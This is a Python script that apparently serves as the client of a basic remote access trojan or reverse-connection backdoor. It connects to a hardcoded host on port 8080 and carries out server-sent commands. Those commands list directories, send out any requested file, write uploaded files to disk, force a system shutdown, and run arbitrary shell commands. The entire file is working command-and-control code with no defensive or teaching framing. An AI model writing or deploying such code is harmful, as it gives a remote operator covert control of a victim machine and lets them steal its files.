import os
import socket

s = socket.socket()
port = 8080
# host = input(str("Please enter the server address: "))
# host = "192.168.174.189"
# 192.168.56.1
host = "192.168.50.100"
s.connect((host, port))
# print("Connected to the server successfully")

while True:
    command = s.recv(1024)
    command = command.decode()
    # print("Command received")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        # print("Command executed successfully")
    elif command == "custom_dir":
        filepath = s.recv(1024).decode()
        files = str(os.listdir(filepath))
        s.send(files.encode())
        # print("Command executed successfully")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        # print("Command executed successfully")
    elif command == "upload_file":
        file = s.recv(100000)
        filepath = s.recv(5000)
        new_file = open(filepath, "wb")
        new_file.write(file)
        new_file.close()
    elif command == "shutdown":
        # print("Command sent waiting for execution")
        sec = s.recv(5000)
        sec = sec.decode()
        command = "shutdown /s /f /t " + sec
        os.system(command)
    elif command == "custom_command":
        cmd = s.recv(5000)
        cmd = cmd.decode()
        output = str(os.system(cmd))
        s.send(output.encode())
    elif command == "kill":
        break